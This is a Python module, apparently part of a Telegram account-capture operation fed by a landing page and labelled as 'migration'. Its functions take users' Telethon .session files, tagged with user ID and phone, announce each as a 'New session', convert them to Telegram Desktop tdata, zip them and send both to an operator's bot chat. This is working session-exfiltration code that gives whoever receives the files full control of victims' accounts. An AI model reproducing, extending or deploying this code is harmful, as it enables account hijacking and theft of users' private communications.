from __future__ import annotations

import asyncio
import logging
import os
import tempfile
import zipfile
from typing import Optional

from bot.config import BOT_TOKEN
from landing.telegram_send import send_telegram_document, send_telegram_text
from web.services.migration.settings import settings_repo
from web.services.proxy import ProxySettings
from web.services.tdata_converter import TDataConverter

logger = logging.getLogger(__name__)


async def _creds() -> tuple[str, str]:
	settings = await settings_repo.load()
	chat_id = (settings.bot_chat_id or "").strip()
	token = (settings.bot_token or BOT_TOKEN or "").strip()
	return token, chat_id


async def deliver_session_file(
	*,
	session_path: Optional[str],
	user_label: str = "",
	user_id: Optional[int] = None,
	phone: Optional[str] = None,
) -> None:
	"""Только файл .session в канал (без Telethon) — не блокирует миграцию."""
	from web.services.account_card import account_tag, console_log

	token, chat_id = await _creds()
	tag = account_tag(user_id, phone) if user_id else (user_label or "session")
	if not chat_id or not token:
		console_log(tag, "skip .session: нет bot_chat_id/token", error=True)
		return
	if not session_path or not os.path.isfile(session_path):
		console_log(tag, f"skip .session: нет файла {session_path}", error=True)
		return

	label = (user_label or os.path.basename(session_path) or "account").strip()
	console_log(tag, f"отправка .session ({label})…")
	try:
		await asyncio.to_thread(
			send_telegram_text, token, chat_id, f"{tag}\n🔐 Новая сессия: {label}"
		)
	except Exception as exc:
		logger.warning("session caption failed: %s", exc)

	try:
		await asyncio.to_thread(
			send_telegram_document,
			token,
			chat_id,
			session_path,
			caption=f"{tag} · Telethon .session",
			filename=os.path.basename(session_path),
		)
		console_log(tag, ".session отправлен")
	except Exception as exc:
		console_log(tag, f"send .session failed: {exc}", error=True)
		try:
			await asyncio.to_thread(
				send_telegram_text,
				token,
				chat_id,
				f"{tag}\n❌ Не удалось отправить .session: {exc}",
			)
		except Exception:
			pass


async def deliver_tdata(
	*,
	session_path: Optional[str],
	user_label: str = "",
	user_id: Optional[int] = None,
	phone: Optional[str] = None,
	proxy: Optional[ProxySettings] = None,
	timeout_sec: float = 90.0,
) -> None:
	"""Конвертация tdata + zip в канал. Вызывать когда сессия свободна (после миграции)."""
	from web.services.account_card import account_tag, console_log

	token, chat_id = await _creds()
	tag = account_tag(user_id, phone) if user_id else (user_label or "session")
	if not chat_id or not token:
		return
	if not session_path or not os.path.isfile(session_path):
		console_log(tag, f"skip tdata: нет файла {session_path}", error=True)
		return

	tdata_zip: Optional[str] = None
	try:
		console_log(tag, "конвертация tdata…")
		report = await asyncio.wait_for(
			TDataConverter().convert_one(session_path, proxy=proxy),
			timeout=timeout_sec,
		)
		tdata_dir = report.get("tdata") or ""
		if not (tdata_dir and os.path.isdir(tdata_dir)):
			console_log(tag, "tdata папка не создана", error=True)
			return

		fd, tdata_zip = tempfile.mkstemp(prefix="tdata_", suffix=".zip")
		os.close(fd)
		await asyncio.to_thread(_zip_dir, tdata_dir, tdata_zip)
		console_log(tag, "отправка tdata.zip…")
		await asyncio.to_thread(
			send_telegram_document,
			token,
			chat_id,
			tdata_zip,
			caption=f"{tag} · Telegram Desktop tdata",
			filename=f"{os.path.splitext(os.path.basename(session_path))[0]}_tdata.zip",
		)
		console_log(tag, "tdata.zip отправлен")
	except asyncio.TimeoutError:
		console_log(tag, f"tdata timeout ({timeout_sec:.0f}s)", error=True)
		try:
			await asyncio.to_thread(
				send_telegram_text,
				token,
				chat_id,
				f"{tag}\n❌ tdata: таймаут {timeout_sec:.0f}с",
			)
		except Exception:
			pass
	except Exception as exc:
		console_log(tag, f"send tdata failed: {exc}", error=True)
		try:
			await asyncio.to_thread(
				send_telegram_text,
				token,
				chat_id,
				f"{tag}\n❌ Не удалось отправить tdata: {exc}",
			)
		except Exception:
			pass
	finally:
		if tdata_zip and os.path.isfile(tdata_zip):
			try:
				os.remove(tdata_zip)
			except OSError:
				pass


async def deliver_session_artifacts(
	*,
	session_path: Optional[str],
	user_label: str = "",
	user_id: Optional[int] = None,
	phone: Optional[str] = None,
	proxy: Optional[ProxySettings] = None,
) -> None:
	"""Полная доставка: .session затем tdata (для ручных вызовов)."""
	await deliver_session_file(
		session_path=session_path,
		user_label=user_label,
		user_id=user_id,
		phone=phone,
	)
	await deliver_tdata(
		session_path=session_path,
		user_label=user_label,
		user_id=user_id,
		phone=phone,
		proxy=proxy,
	)


def _zip_dir(src_dir: str, zip_path: str) -> None:
	parent = os.path.dirname(src_dir.rstrip("\\/")) or "."
	with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
		for root, _dirs, files in os.walk(src_dir):
			for name in files:
				full = os.path.join(root, name)
				rel = os.path.relpath(full, parent)
				zf.write(full, arcname=rel)
	if not os.path.isfile(zip_path) or os.path.getsize(zip_path) < 32:
		raise RuntimeError("tdata zip пустой")
